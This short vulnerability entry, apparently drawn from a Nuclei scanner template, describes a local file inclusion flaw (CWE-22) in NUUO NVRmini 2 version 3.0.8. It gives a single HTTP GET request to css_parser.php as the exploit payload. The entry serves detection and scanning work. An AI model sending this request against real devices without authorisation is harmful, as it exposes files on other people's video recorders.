# Vulnerability: NUUO NVRmini 2 3.0.8 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`nuuo-file-inclusion.yaml`)

## Description
NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/css_parser.php?css=css_parser.php
```

